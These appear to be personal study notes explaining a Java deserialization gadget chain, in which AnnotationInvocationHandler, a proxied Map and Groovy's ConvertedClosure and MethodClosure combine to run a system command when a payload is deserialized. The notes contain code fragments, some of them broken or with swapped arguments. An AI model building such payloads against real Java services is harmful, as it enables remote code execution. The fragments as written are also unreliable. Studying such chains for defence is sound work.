our entry class should have a usefull definition of readObject() in it

class AnnotationInvocationHandler implements InvocationHandler, Serializable{}

this is class we will be using as it is Serializable and takes

Class<? extends Annotation> type, Map<String, Object> memberValue as the parmaters

a Annoation class and Map object


readObject

 for (Map.Entry<String, Object> memberValue : memberValues.entrySet())

entrySet method is called all the objects in map

first we got bring the class and its methods into our context, we can use refection to do that

String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
// name of the class that we need

Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructor()[0];

// Class.forName -> return the specified class object
// Objectoftheclass.getDeclaredConstuctor() -> returns a array of Constructor object and the required parameter for the constructor

Now we have the constructor of the class

our constuctor two parmaters as we know they are 

Class<? extends Annotation> type -> undetermined class but it should be extending Annotation
Map<String, Object> memberValues -> map object

also we have check in readObject that should be true

AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(type);
        } catch(IllegalArgumentException e) {
        }

so our first parameter shoudl be of AnnotationType, which is done using Override.class // which i still dont understand how

Now we use java proxy to enter someother class for the second parmater

when a proxy class i called it ivokes the invoke() method

When a proxy object is invoked, the proxy decides if it has to invoke the original method or some handler, the handler may do its taks and may also call the orignal method

Map test = (Map) Proxy.newProxyInstance(test.class.getClassLoader(), new Class[] {Map.class}, handler);

This creates a Proxy object of map type that we pass as second parameter

when the second_parameter.entrySet() method is called when the our payload is deserialized, our proxy invokes the handler

now we have to find a good handler that can do something intersting

ConvertedClosure extends ConversionHandler which implements invocationHandler, thus we call the invoke method in this class

	return invokeCustom(proxy, method, args); // the invoke method call invokeCustom method wihc defined by the child class

	if (methodName!=null && !methodName.equals(method.getName())) return null;
        return ((Closure) getDelegate()).call(args);

	getDelegate() returns delegate which is assiged to a object

	which we can initilize to our MethodClosure object

	object.call(args) is called

	which returns (V)getMetaClass().invokeMethod(this, "doCall", args)
        thus calling MethodClosure.doCall(args)

	doCall method calls

	public static Object invokeMethod(Object object, String methodName, Object arguments)

	which inturn call the finall exec function

groovy can create anonymous function using closure class

convertedClosure test = new ConvertedClosure(Closure closure, String method)

the closure can created using MethodClosureclass 

public MethodClosure(Object owner, String method)

thus 

MethodClosure method = new MethodClosure("cmd", execute);

in grovvy to run system commds we can user string.execute

ConvertedClosure pay = new ConvertedClosure(method, "entrySet");

now we defined a new method called entrySet which will execute cmd

Map test = (Map) Proxy.newProxyInstance(test.class.getClassLoader(), new Class[] {Map.class}, pay);

so initially

when our payload get deserialized, 

-> we have sent a AnnotationInvocationHandler object

-> readObject is called in that object

-> readObject implemenation calls entrySet() in all objects of map

-> we have replaced the map object with a proxy

-> invoke() method is called on closure object which then call method clousre object which has the anon function defined as entrySet()


thus we get code execution
